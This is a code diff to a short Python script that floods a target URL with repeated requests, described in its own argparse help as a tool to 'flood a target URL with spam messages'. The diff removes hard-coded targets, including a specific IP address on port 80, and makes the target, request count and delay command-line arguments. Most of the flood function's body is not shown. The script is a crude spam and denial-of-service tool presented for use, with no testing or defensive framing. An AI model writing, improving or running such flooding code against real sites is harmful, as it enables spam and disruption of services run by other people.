@@ -1,5 +1,5 @@
+import argparse
 import requests
-import random
 import time
 
 def flood(url, count, delay):
@@ -14,25 +14,14 @@ def flood(url, count, delay):
         time.sleep(delay)  # Add a delay between each request
 
 def main():
-    url = "enter the target url"
-    count = 200 # Adjus the count or requests
-    delay = 1  # Adjust the delay time as desired
+    parser = argparse.ArgumentParser(description='Flood a target URL with spam messages.')
+    parser.add_argument('url', help='The target URL to flood.')
+    parser.add_argument('count', type=int, help='The number of requests to send.')
+    parser.add_argument('delay', type=float, help='The delay time between each request in seconds.')
 
-    flood(url, count, delay)
+    args = parser.parse_args()
 
-if __name__ == '__main__':
-    main()
-
-
-def main():
-    ip_address = "192.179.10.0"
-    port = 80
-    count = 200
-    delay = 1 # Adjust this with your own desired 
-
-    flood(ip_address, count, delay)
+    flood(args.url, args.count, args.delay)
 
 if __name__ == '__main__':
     main()
-
-    
